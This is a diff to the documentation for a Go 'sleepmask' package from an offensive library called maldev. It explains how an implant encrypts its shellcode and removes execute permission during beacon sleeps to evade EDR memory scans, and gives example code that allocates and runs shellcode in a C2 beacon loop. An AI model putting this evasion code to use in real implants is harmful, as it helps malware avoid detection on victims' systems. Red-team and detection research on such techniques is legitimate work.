@@ -4,11 +4,11 @@
 
 ## For Beginners
 
-When your implant is not actively doing something, it sleeps -- waiting for the next command from the operator. During this idle time, the shellcode sits in memory, fully readable. Memory scanners (like YARA-based tools or EDR memory scans) can sweep through process memory and find the shellcode bytes, even though the code is not currently running.
+When you go to sleep at night, you are vulnerable -- anyone could search your house and read your diary. But what if, every night before bed, you lock your diary in a safe with a random combination, and when you wake up, you unlock it and continue writing? Anyone who searches your house while you sleep finds only an unreadable locked safe.
 
-Sleep masking is like locking your diary and hiding it under the mattress every night before you go to sleep. Before entering the sleep period, the implant encrypts its own memory regions with a random XOR key and downgrades the page permissions from "executable" to "read-write" (non-executable). While sleeping, any memory scanner that reads those pages sees only encrypted gibberish in non-executable memory -- nothing suspicious. When the implant wakes up, it decrypts the regions, restores the original permissions, and continues executing.
+The sleep mask technique does this for shellcode in memory. When the implant enters a sleep cycle (waiting between beaconing intervals), it XOR-encrypts its own memory regions with a random key and downgrades the page permissions from executable (`RX`) to just readable/writable (`RW`). Memory scanners that sweep the process during sleep find only encrypted gibberish in non-executable pages -- no signatures match, no code is detected. When the sleep ends, the mask decrypts the regions and restores the original permissions.
 
-This is a runtime protection technique. Unlike AMSI bypass or ETW patching (which are one-time actions), sleep masking runs continuously throughout the implant's lifetime, protecting it during every idle period.
+This defeats periodic memory scanning, which is how many EDR products detect in-memory implants. Without the sleep mask, the shellcode sits in executable memory 24/7, giving scanners unlimited time to find it.
 
 ## How It Works
 
@@ -16,47 +16,44 @@ This is a runtime protection technique. Unlike AMSI bypass or ETW patching (whic
 sequenceDiagram
     participant Implant as Implant Code
     participant Mask as Sleep Mask
-    participant Memory as Process Memory
+    participant Memory as Memory Pages
     participant Scanner as Memory Scanner
 
-    Implant->>Mask: mask.Sleep(30s)
+    Implant->>Mask: Sleep(30s)
 
     Mask->>Mask: Generate random 32-byte XOR key
 
     loop For each registered region
         Mask->>Memory: XOR encrypt region in-place
-        Mask->>Memory: VirtualProtect → PAGE_READWRITE
+        Mask->>Memory: VirtualProtect(RW)
     end
 
-    Note over Memory: Regions now encrypted + non-executable
+    Note over Memory: Pages now: RW + encrypted bytes
 
-    Scanner->>Memory: Scan process memory
-    Memory-->>Scanner: Encrypted gibberish in RW pages
-    Scanner->>Scanner: Nothing suspicious found
+    Scanner->>Memory: Scan for signatures
+    Memory-->>Scanner: Encrypted gibberish, no match
 
-    Mask->>Mask: Sleep for duration
+    Mask->>Mask: time.Sleep(30s) or BusyWaitTrig
 
     loop For each registered region
-        Mask->>Memory: VirtualProtect → PAGE_READWRITE (ensure writable)
+        Mask->>Memory: VirtualProtect(RW) if needed
         Mask->>Memory: XOR decrypt region in-place
-        Mask->>Memory: VirtualProtect → original protection
+        Mask->>Memory: VirtualProtect(original)
     end
 
-    Note over Memory: Regions restored to original state
-
     Mask->>Mask: Zero XOR key from memory
-
-    Mask-->>Implant: Return (resume execution)
+    Mask-->>Implant: Return
 ```
 
 **Step-by-step:**
 
-1. **Generate key** -- Create a cryptographically random 32-byte XOR key using `crypto/rand`.
-2. **Encrypt regions** -- For each registered memory region, XOR all bytes in-place with the repeating key.
-3. **Downgrade permissions** -- `VirtualProtect` each region to `PAGE_READWRITE`, removing the executable bit. Save original permissions.
-4. **Sleep** -- Either `time.Sleep` (standard, hookable) or `timing.BusyWaitTrig` (CPU-burn, defeats sleep-hooking sandboxes).
-5. **Decrypt regions** -- Ensure pages are writable, XOR decrypt in-place, restore original page permissions.
-6. **Zero key** -- Overwrite the XOR key in memory to prevent recovery.
+1. **Generate key** -- Create a random 32-byte XOR key using `crypto/rand`.
+2. **Encrypt regions** -- For each registered memory region, XOR every byte with the repeating key.
+3. **Downgrade permissions** -- `VirtualProtect` each region to `PAGE_READWRITE`, removing the executable bit. Save original protections.
+4. **Sleep** -- Either `time.Sleep` (standard, hookable) or `BusyWaitTrig` (CPU-burn trigonometric busy wait that defeats Sleep hooks and sandbox time-acceleration).
+5. **Decrypt regions** -- XOR again with the same key (XOR is self-inverse) to restore the original bytes.
+6. **Restore permissions** -- `VirtualProtect` each region back to its original protection (e.g., `PAGE_EXECUTE_READ`).
+7. **Zero key** -- Overwrite the key bytes in memory to prevent forensic recovery.
 
 ## Usage
 
@@ -70,14 +67,13 @@ import (
 )
 
 func main() {
-    // Register the memory regions containing your shellcode.
+    // Register memory regions to encrypt during sleep.
     mask := sleepmask.New(
         sleepmask.Region{Addr: shellcodeAddr, Size: shellcodeSize},
     )
 
-    // Sleep for 30 seconds -- regions encrypted during this time.
+    // Sleep for 30 seconds with encrypted memory.
     mask.Sleep(30 * time.Second)
-    // Regions are now decrypted and executable again.
 }
 ```
 
@@ -95,27 +91,25 @@ import (
 )
 
 func main() {
-    shellcode := []byte{0x90, 0x90, 0xCC} // your real shellcode
+    shellcode := []byte{ /* ... */ }
 
-    // 1. Allocate and prepare shellcode memory.
+    // Allocate and write shellcode.
     addr, _ := windows.VirtualAlloc(0, uintptr(len(shellcode)),
         windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
-    // ... copy shellcode, VirtualProtect to RX ...
+    copy((*[1 << 20]byte)(unsafe.Pointer(addr))[:len(shellcode)], shellcode)
+    var old uint32
+    windows.VirtualProtect(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &old)
 
-    // 2. Create sleep mask with busy-wait method (defeats sandbox sleep-skip).
+    // Create sleep mask for the shellcode region.
     mask := sleepmask.New(
         sleepmask.Region{Addr: addr, Size: uintptr(len(shellcode))},
-    ).WithMethod(sleepmask.MethodBusyTrig)
+    ).WithMethod(sleepmask.MethodBusyTrig) // defeat Sleep hooks
 
-    // 3. C2 beacon loop.
+    // Beacon loop: execute, then sleep with encrypted memory.
     for {
-        // ... check in with C2 server ...
-
-        // Sleep between check-ins -- shellcode encrypted during this time.
-        mask.Sleep(30 * time.Second)
+        inject.ExecuteCallback(addr, inject.CallbackEnumWindows)
+        mask.Sleep(30 * time.Second) // encrypted during sleep
     }
-
-    _ = inject.MethodCreateRemoteThread // suppress unused import
 }
 ```
 
@@ -123,24 +117,24 @@ func main() {
 
 | Aspect | Detail |
 |--------|--------|
-| Stealth | High -- encrypted memory in RW pages does not trigger executable-memory YARA scans. |
-| Key management | Random 32-byte key per sleep cycle, zeroed after use. No key reuse. |
-| Permission handling | Saves and restores ORIGINAL permissions (not hardcoded PAGE_EXECUTE_READ). Works with any initial protection. |
-| Sleep methods | `MethodNtDelay` (standard `time.Sleep`) or `MethodBusyTrig` (CPU trigonometric busy-wait to defeat sandbox time-skip). |
-| Limitations | The brief window during encrypt/decrypt is vulnerable to scanning. The XOR key is in memory during sleep (though finding it requires knowing where to look). Does not protect against kernel-mode memory access. |
-| Overhead | Minimal -- XOR is fast, even for large regions. The main cost is the sleep duration itself. |
+| Stealth | High -- memory scanners find only encrypted RW pages during sleep. No executable code is visible. |
+| Key management | 32-byte random key per sleep cycle, zeroed after use. |
+| Permission handling | Saves and restores ORIGINAL page protections (not hardcoded). Handles mixed RX/RWX regions correctly. |
+| Sleep methods | `MethodNtDelay` (standard `time.Sleep`) or `MethodBusyTrig` (CPU-burn, defeats sandbox time-acceleration and Sleep hooks). |
+| Multiple regions | Supports encrypting multiple non-contiguous memory regions per sleep cycle. |
+| Limitations | The sleep mask code itself must remain unencrypted and executable. Very short sleep intervals add CPU overhead from encrypt/decrypt cycles. The XOR key is in memory briefly (zeroed after). |
+| Self-encryption | The mask encrypts the regions but cannot encrypt itself -- a small code footprint remains scannable. |
 
 ## Compared to Other Implementations
 
 | Feature | maldev | Sliver | CobaltStrike | D3Ext/maldev |
 |---------|--------|--------|--------------|--------------|
-| XOR encryption during sleep | Yes | Yes (garble) | Sleep mask (BOF) | No |
-| Permission downgrade (RX→RW) | Yes | No | Yes | No |
-| Random key per cycle | Yes (32 bytes) | Yes | Yes | N/A |
-| Key zeroing | Yes | Unknown | Unknown | N/A |
-| Busy-wait sleep method | Yes (`BusyWaitTrig`) | No | No | No |
-| Multiple regions | Yes (variadic `Region`) | Single | Single | N/A |
-| Original permission restore | Yes (saved per-region) | No | Unknown | N/A |
+| XOR encryption | 32-byte random key | AES | XOR (sleep mask BOF) | No |
+| Permission downgrade | RW during sleep | Yes | Yes | N/A |
+| Busy wait option | `MethodBusyTrig` | No | No | No |
+| Multi-region support | Yes | No | No | N/A |
+| Original protection restore | Yes (saved per region) | Yes | Yes | N/A |
+| Key zeroing | Yes | Yes | Unknown | N/A |
 
 ## API Reference
 
@@ -155,7 +149,7 @@ type Region struct {
 type SleepMethod int
 const (
     MethodNtDelay  SleepMethod = iota  // standard time.Sleep
-    MethodBusyTrig                      // CPU-burn trig busy wait
+    MethodBusyTrig                      // CPU-burn busy wait
 )
 
 // New creates a Mask for the given memory regions.
@@ -164,6 +158,6 @@ func New(regions ...Region) *Mask
 // WithMethod sets the sleep method (default: MethodNtDelay).
 func (m *Mask) WithMethod(method SleepMethod) *Mask
 
-// Sleep encrypts regions, sleeps, decrypts, restores permissions.
+// Sleep encrypts regions, sleeps, then decrypts and restores permissions.
 func (m *Mask) Sleep(d time.Duration)
 ```
